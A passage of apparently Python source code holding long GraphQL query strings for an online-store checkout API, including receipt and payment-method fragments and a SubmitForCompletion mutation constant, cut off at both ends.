ephemeralPublicKey publicKeyHash transactionId __typename}__typename}... on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}... on FacebookPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}... on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}... on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{... on IdealPaymentMethodParameters{bank __typename}__typename}__typename}... on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}... on OffsitePaymentMethod{paymentMethodIdentifier name __typename}... on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}... on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}... on ManualPaymentMethod{id name paymentMethodIdentifier __typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}... on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}... on NoopPaymentMethod{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{... on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{... on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}... on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}... on WaitingReceipt{id pollDelay __typename}... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}... on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}... on FailedReceipt{id processingError{... on InventoryClaimFailure{__typename}... on InventoryReservationFailure{__typename}... on OrderCreationFailure{paymentsHaveBeenReverted __typename}... on OrderCreationSchedulingFailure{__typename}... on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}... on DiscountUsageLimitExceededFailure{__typename}... on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{... on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}pickupLocation{... on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{... on PurchaseOrderMerchandiseLine{stableId quantity{... on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}... on PurchaseOrderBundleLineComponent{stableId quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}... on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{... on PurchaseOrderMerchandiseLine{stableId quantity{... on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}... on PurchaseOrderBundleLineComponent{stableId quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}... on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{... on PurchaseOrderPaymentTerms{billingAddress{__typename... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{... on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}... on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}... on WalletPaymentMethod{name walletContent{... on ShopPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}... on PaypalWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}... on ApplePayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}data signature version __typename}... on GooglePayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}... on FacebookPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}... on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}... on WalletsPlatformPaymentMethod{name walletParams __typename}... on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}additionalParameters{... on IdealPaymentMethodParameters{bank __typename}__typename}__typename}... on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on PaypalBillingAgreementPaymentMethod{token billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}... on RedeemablePaymentMethod{redemptionSource redemptionContent{... on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}... on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}... on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}... on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{... on PurchaseOrderBuyerIdentityTerms{contactMethod{... on PurchaseOrderEmailContactMethod{email __typename}... on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{... on PurchaseOrderEmailContactMethod{email __typename}... on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename... on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}... on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}... on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename... on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){... on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}... on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}... on SubmitFailed{reason __typename}... on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{... on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml... on RemoveTermViolation{message{code localizedDescription __typename}target __typename}... on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}... on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}... on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}... on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}... on ApplyChangeViolation{message{code localizedDescription __typename}target from{... on ApplyChangeValueInt{value __typename}... on ApplyChangeValueRemoval{value __typename}... on ApplyChangeValueString{value __typename}__typename}to{... on ApplyChangeValueInt{value __typename}... on ApplyChangeValueRemoval{value __typename}... on ApplyChangeValueString{value __typename}__typename}__typename}... on InputValidationError{field __typename}... on PendingTermViolation{__typename}__typename}__typename}__typename}... on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}... on CheckpointDenied{redirectUrl __typename}... on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{... on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{... on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}... on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}... on WaitingReceipt{id pollDelay __typename}... on ActionRequiredReceipt{id action{... on CompletePaymentChallenge{offsiteRedirect url __typename}... on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}... on FailedReceipt{id processingError{... on InventoryClaimFailure{__typename}... on InventoryReservationFailure{__typename}... on OrderCreationFailure{paymentsHaveBeenReverted __typename}... on OrderCreationSchedulingFailure{__typename}... on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}... on DiscountUsageLimitExceededFailure{__typename}... on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{... on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}pickupLocation{... on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}... on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{... on PurchaseOrderMerchandiseLine{stableId quantity{... on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}... on PurchaseOrderBundleLineComponent{stableId quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}... on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{... on PurchaseOrderMerchandiseLine{stableId quantity{... on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}... on PurchaseOrderBundleLineComponent{stableId quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}... on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{... on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{... on PurchaseOrderPaymentTerms{billingAddress{__typename... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{... on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}... on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}... on WalletPaymentMethod{name walletContent{... on ShopPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}... on PaypalWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}... on ApplePayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}data signature version __typename}... on GooglePayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}... on FacebookPayWalletContent{billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}... on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}... on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}... on WalletsPlatformPaymentMethod{name walletParams __typename}... on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}additionalParameters{... on IdealPaymentMethodParameters{bank __typename}__typename}__typename}... on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{... on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}... on InvalidBillingAddress{__typename}__typename}__typename}... on DeferredPaymentMethod{orderingIndex displayName __typename}... on PaypalBillingAgreementPaymentMethod{token billingAddress{... on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}... on RedeemablePaymentMethod{redemptionSource redemptionContent{... on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{... on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}... on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}... on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}... on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{... on PurchaseOrderBuyerIdentityTerms{contactMethod{... on PurchaseOrderEmailContactMethod{email __typename}... on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{... on PurchaseOrderEmailContactMethod{email __typename}... on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename... on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}... on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}... on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename... on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename... on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount 